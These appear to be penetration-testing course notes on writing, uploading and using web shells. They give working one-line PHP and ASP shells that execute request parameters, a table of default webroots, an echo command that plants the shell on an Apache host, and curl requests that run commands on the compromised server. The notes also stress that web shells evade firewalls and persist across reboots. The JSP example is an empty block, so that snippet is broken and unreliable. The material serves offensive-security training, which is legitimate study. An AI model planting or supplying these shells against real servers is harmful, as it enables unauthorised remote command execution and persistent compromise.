# Web Shell

## Writing a Web Shell
First of all, we need to write our web shell that would take our command through a GET request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:

### Code: `php`

    <?php system($_REQUEST["cmd"]); ?>

### Code: `jsp`

    <%                                                         %>

### Code: `asp`

    <% eval request("cmd") %>

## Uploading a Web Shell
Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. `shell.php` and upload it, and then access our uploaded file to execute commands.

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

| **Webserver**   | **Default Webroot**   |
| --------------|-------------------|
| `Apache` | /var/www/html/ |
| `Nginx` | /usr/local/nginx/html/ |
| `IIS` | c:\inetpub\wwwroot\ |
| `XAMPP` | C:\xampp\htdocs\ |

We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:

### Code: bash
    
    echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php

## Accessing Web Shell

Once we write our web shell, we can either access it through a browser or by using `cURL`. We can visit the `shell.php` page on the compromised website, and use ?cmd=id to execute the id command:

   
http://SERVER_IP:PORT/shell.php?cmd=id
![image](https://user-images.githubusercontent.com/87195021/162104832-eeac112b-d5c3-4789-9fc6-d8601175e93a.png)

### Another option is to use cURL:

    MBWest@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
As we can see, we can keep changing the command to get its output. A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.